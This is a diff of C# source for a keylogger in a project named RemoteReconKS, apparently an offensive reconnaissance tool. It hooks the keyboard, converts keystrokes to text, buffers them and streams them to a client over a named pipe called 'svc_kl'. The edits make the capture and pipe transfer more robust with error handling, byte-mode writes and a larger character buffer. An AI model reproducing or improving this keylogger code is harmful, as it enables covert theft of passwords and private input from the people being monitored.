@@ -17,7 +17,7 @@ namespace RemoteReconKS
 
         private static NamedPipeServerStream server;
         private static StreamWriter sw;
-        private static StringBuilder keylogoutput;
+        private static StringBuilder keylogoutput = new StringBuilder();
 
         public static void Main(string[] arg)
         {
@@ -80,28 +80,50 @@ namespace RemoteReconKS
             Task t = new Task(runner);
             t.Start();
 #if DEBUG
-            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Background Thread started");
+            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Starting Application loop");
 #endif
-
-            Application.Run();
-            WinApi.UnhookWindowsHookEx(WinApi._hookID);
+            try
+            {
+                Application.Run();
+                WinApi.UnhookWindowsHookEx(WinApi._hookID);
+            }
+            catch (Exception e)
+            {
+#if DEBUG
+                File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", e.ToString());
+#endif
+                
+            }
+            
         }
 
+        
         private static void LogKeyStrokes()
         {
-            NamedPipeServerStream server = new NamedPipeServerStream("svc_kl", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
+            NamedPipeServerStream server = new NamedPipeServerStream("svc_kl", PipeDirection.InOut, 1, PipeTransmissionMode.Byte);
             server.WaitForConnection();
 #if DEBUG
             File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Received connection from client");
 #endif
             while (server.IsConnected)
             {
-                StreamWriter sw = new StreamWriter(server);
                 if (keylogoutput.Length != 0)
                 {
-                    sw.Write(keylogoutput.ToString());
-                    keylogoutput.Remove(0, keylogoutput.Length);
+                    try
+                    {
+                        byte[] msg = Encoding.Unicode.GetBytes(keylogoutput.ToString());
+                        server.Write(msg, 0, msg.Length);
+                        keylogoutput.Remove(0, keylogoutput.Length);
+                    }
+                    catch (Exception e)
+                    {
+#if DEBUG
+                        File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", e.ToString());
+#endif
+                    }
                 }
+
+                Thread.Sleep(5000);
             }
 #if DEBUG
             File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Client disconnected");
@@ -124,6 +146,7 @@ namespace RemoteReconKS
         public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             byte[] keyboardState = new byte[256];
+            //StringBuilder keylogoutput = new StringBuilder();
             IntPtr kblh = WinApi.GetKeyboardLayout(Process.GetCurrentProcess().Id);
 
             if (nCode >= 0 && (wParam == (IntPtr)WinApi.WM_KEYDOWN || wParam == (IntPtr)WinApi.WM_SYSKEYDOWN))
@@ -156,25 +179,9 @@ namespace RemoteReconKS
                 //Check if the shift modifier was used
                 bool shiftMod = Convert.ToBoolean((int)WinApi.GetAsyncKeyState(Keys.ShiftKey) & 32768);
                 var scancode = WinApi.MapVirtualKeyEx((uint)vkCode, 0x04, kblh);
-                /*
-                IntPtr hWindow = GetForegroundWindow();
-
-                string WindowTitle = "";
-                foreach (Process proc in Process.GetProcesses())
-                {
-                    if (proc.MainWindowHandle == hWindow)
-                    {
-                        WindowTitle = proc.MainWindowTitle;
-                    }
-                }*/
 
                 if (scancode > 0)
                 {
-                    /*if (WindowTitle != LastWindowTitle)
-                    {
-                        keylogoutput.Append("\n{" + WindowTitle + "}\n");
-                        LastWindowTitle = WindowTitle;
-                    }*/
 
                     if (shiftMod)
                     {
@@ -182,7 +189,7 @@ namespace RemoteReconKS
                         keyboardState[(int)Keys.LShiftKey] = 0x80;
                     }
 
-                    var s = new StringBuilder(5);
+                    var s = new StringBuilder(256);
                     var returnCode = WinApi.ToUnicodeEx((uint)vkCode, scancode, keyboardState, s, s.Capacity, 0, kblh);
                     keylogoutput.Append(s.ToString());
                 }
